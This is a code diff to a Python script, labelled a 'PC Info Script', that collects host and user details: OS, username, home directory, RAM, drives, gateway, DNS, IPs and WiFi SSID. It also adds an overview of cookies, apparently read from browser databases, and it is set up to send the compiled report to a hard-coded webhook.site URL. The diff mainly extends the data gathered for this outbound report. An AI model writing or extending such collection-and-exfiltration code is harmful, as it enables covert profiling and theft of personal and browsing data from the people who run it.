@@ -2,6 +2,15 @@
 """PC Info Script (minimal dependencies, standard library only)
 
 Features:
+- Betriebssystem-Infos (Name, Version, Architektur)
+- Benutzername & Home-Verzeichnis
+- CPU-Infos (Kerne, Architektur)
+- RAM (gesamt & frei)
+- Laufwerke & freier Speicher
+- Standard-Gateway (Best-Effort)
+- DNS-Server (Best-Effort)
+- Zeitstempel
+- Script-Version
 - Hostname
 - Private IP (best-effort)
 - Public IP (HTTPS)
@@ -25,8 +34,14 @@ Tests:
 
 from __future__ import annotations
 
+import ctypes
+import datetime
+import getpass
 import os
+import platform
+import shutil
 import socket
+import string
 import uuid
 import subprocess
 import urllib.request
@@ -34,17 +49,218 @@ import urllib.error
 import sys
 import sqlite3
 from collections import defaultdict
-from typing import Dict, List
+from typing import Dict, List, Tuple
 
 # -----------------
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
+SCRIPT_VERSION = "1.3.0"
 
 
 # -----------------
 # DATA COLLECTION
 # -----------------
+
+
+def format_bytes(num: float) -> str:
+    step = 1024.0
+    units = ["B", "KB", "MB", "GB", "TB", "PB"]
+    size = float(num)
+    for unit in units:
+        if size < step:
+            return f"{size:.1f} {unit}" if unit != "B" else f"{int(size)} {unit}"
+        size /= step
+    return f"{size:.1f} PB"
+
+
+def get_os_info() -> Dict[str, str]:
+    return {
+        "name": platform.system() or "unbekannt",
+        "version": platform.version() or "unbekannt",
+        "arch": platform.machine() or "unbekannt",
+    }
+
+
+def get_user_info() -> Dict[str, str]:
+    try:
+        username = getpass.getuser()
+    except Exception:
+        username = "unbekannt"
+    return {"username": username, "home": os.path.expanduser("~") or "unbekannt"}
+
+
+def get_cpu_info() -> Dict[str, str]:
+    return {
+        "cores": str(os.cpu_count() or "unbekannt"),
+        "arch": platform.machine() or "unbekannt",
+    }
+
+
+def _ram_windows() -> Tuple[int, int] | Tuple[None, None]:
+    try:
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", ctypes.c_ulong),
+                ("dwMemoryLoad", ctypes.c_ulong),
+                ("ullTotalPhys", ctypes.c_ulonglong),
+                ("ullAvailPhys", ctypes.c_ulonglong),
+                ("ullTotalPageFile", ctypes.c_ulonglong),
+                ("ullAvailPageFile", ctypes.c_ulonglong),
+                ("ullTotalVirtual", ctypes.c_ulonglong),
+                ("ullAvailVirtual", ctypes.c_ulonglong),
+                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
+            ]
+
+        stat = MEMORYSTATUSEX()
+        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
+            return int(stat.ullTotalPhys), int(stat.ullAvailPhys)
+    except Exception:
+        pass
+    return None, None
+
+
+def _ram_linux() -> Tuple[int, int] | Tuple[None, None]:
+    total = available = None
+    try:
+        with open("/proc/meminfo", "r", encoding="utf-8") as f:
+            for line in f:
+                if line.startswith("MemTotal:"):
+                    parts = line.split()
+                    total = int(parts[1]) * 1024
+                elif line.startswith("MemAvailable:"):
+                    parts = line.split()
+                    available = int(parts[1]) * 1024
+                if total is not None and available is not None:
+                    break
+    except OSError:
+        return None, None
+    return total, available
+
+
+def _ram_macos() -> Tuple[int, int] | Tuple[None, None]:
+    try:
+        total_raw = run_cmd(["sysctl", "-n", "hw.memsize"]).strip()
+        total = int(total_raw) if total_raw else None
+    except Exception:
+        total = None
+
+    free = None
+    try:
+        out = run_cmd(["vm_stat"])
+        page_size = os.sysconf("SC_PAGE_SIZE") if hasattr(os, "sysconf") else 4096
+        free_pages = 0
+        for line in out.splitlines():
+            if ":" not in line:
+                continue
+            key, value = line.split(":", 1)
+            if key.strip() in {"Pages free", "Pages inactive"}:
+                try:
+                    free_pages += int(value.strip().strip("."))
+                except ValueError:
+                    continue
+        if free_pages:
+            free = free_pages * page_size
+    except Exception:
+        pass
+    return total, free
+
+
+def get_ram_info() -> Tuple[str, str]:
+    total = free = None
+    if sys.platform.startswith("win"):
+        total, free = _ram_windows()
+    elif sys.platform.startswith("linux"):
+        total, free = _ram_linux()
+    elif sys.platform == "darwin":
+        total, free = _ram_macos()
+
+    total_str = format_bytes(total) if total is not None else "unbekannt"
+    free_str = format_bytes(free) if free is not None else "unbekannt"
+    return total_str, free_str
+
+
+def get_storage_info() -> List[Tuple[str, str, str]]:
+    paths = []
+    seen = set()
+
+    if os.name == "nt":
+        for letter in string.ascii_uppercase:
+            drive = f"{letter}:\\"
+            if os.path.exists(drive):
+                paths.append(drive)
+    else:
+        paths.extend([os.path.abspath(os.sep), os.path.expanduser("~")])
+
+    entries: List[Tuple[str, str, str]] = []
+    for p in paths:
+        key = os.path.abspath(p)
+        if key in seen:
+            continue
+        seen.add(key)
+        try:
+            usage = shutil.disk_usage(p)
+            entries.append((key, format_bytes(usage.free), format_bytes(usage.total)))
+        except OSError:
+            continue
+    return entries
+
+
+def get_default_gateway() -> str:
+    if sys.platform.startswith("linux"):
+        out = run_cmd(["ip", "route"])
+        for line in out.splitlines():
+            if line.startswith("default "):
+                parts = line.split()
+                if len(parts) >= 3:
+                    return parts[2]
+    elif sys.platform.startswith("win"):
+        out = run_cmd(["ipconfig"])
+        for line in out.splitlines():
+            if "Default Gateway" in line:
+                if ":" in line:
+                    candidate = line.split(":", 1)[1].strip()
+                    if candidate:
+                        return candidate
+    elif sys.platform == "darwin":
+        out = run_cmd(["route", "-n", "get", "default"])
+        for line in out.splitlines():
+            if "gateway:" in line:
+                return line.split("gateway:", 1)[1].strip()
+    return "unbekannt"
+
+
+def get_dns_servers() -> List[str]:
+    servers: List[str] = []
+    if sys.platform.startswith("win"):
+        out = run_cmd(["ipconfig", "/all"])
+        collecting = False
+        for line in out.splitlines():
+            stripped = line.strip()
+            if "DNS-Server" in stripped or "DNS Servers" in stripped:
+                collecting = True
+                parts = stripped.split(":", 1)
+                if len(parts) == 2 and parts[1].strip():
+                    servers.append(parts[1].strip())
+                continue
+            if collecting and stripped:
+                if stripped[0].isdigit():
+                    servers.append(stripped)
+                else:
+                    collecting = False
+    else:
+        try:
+            with open("/etc/resolv.conf", "r", encoding="utf-8") as f:
+                for line in f:
+                    if line.startswith("nameserver"):
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            servers.append(parts[1])
+        except OSError:
+            pass
+
+    return servers if servers else ["unbekannt"]
 
 def get_hostname() -> str:
     return socket.gethostname()
@@ -206,8 +422,60 @@ def read_cookies_overview() -> List[str]:
 # -----------------
 
 def build_lines() -> List[str]:
+    os_info = get_os_info()
+    user_info = get_user_info()
+    cpu_info = get_cpu_info()
+    total_ram, free_ram = get_ram_info()
+    storage_entries = get_storage_info()
+    gateway = get_default_gateway()
+    dns_servers = get_dns_servers()
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     wifi = get_wifi_info()
     lines: List[str] = [
+        "System:",
+        f"  OS: {os_info['name']}",
+        f"  Version: {os_info['version']}",
+        f"  Architektur: {os_info['arch']}",
+        "",
+        "Benutzer:",
+        f"  Username: {user_info['username']}",
+        f"  Home: {user_info['home']}",
+        "",
+        "CPU:",
+        f"  Kerne (logisch): {cpu_info['cores']}",
+        f"  Architektur: {cpu_info['arch']}",
+        "",
+        "Arbeitsspeicher:",
+        f"  Gesamt: {total_ram}",
+        f"  Frei: {free_ram}",
+        "",
+        "Speicher:",
+    ]
+
+    if storage_entries:
+        for path, free, total in storage_entries:
+            lines.append(f"  {path}  Frei: {free} / {total}")
+    else:
+        lines.append("  (keine Daten)")
+
+    lines.extend([
+        "",
+        "Netzwerk:",
+        f"  Gateway: {gateway}",
+        "DNS:",
+    ])
+
+    for dns in dns_servers:
+        lines.append(f"  - {dns}")
+
+    lines.extend([
+        "",
+        "Zeit:",
+        f"  {timestamp}",
+        "",
+        "Script:",
+        f"  Version: {SCRIPT_VERSION}",
+        "",
         f"PC-Name (Hostname): {get_hostname()}",
         f"Private IP: {get_private_ip()}",
         f"Public IP: {get_public_ip()}",
@@ -216,7 +484,7 @@ def build_lines() -> List[str]:
         f"  Interface: {wifi['interface']}",
         f"  SSID: {wifi['ssid']}",
         "",
-    ]
+    ])
     lines.extend(read_cookies_overview())
     return lines
 
@@ -288,6 +556,9 @@ def _selftest() -> int:
             lines = build_lines()
             self.assertTrue(any(x.startswith("PC-Name") for x in lines))
             self.assertIn("WLAN:", lines)
+            self.assertIn("System:", lines)
+            self.assertIn("DNS:", lines)
+            self.assertIn("Script:", lines)
 
         def test_send_text_to_webhook_bad_url_raises(self):
             # This should raise URLError because host is invalid.
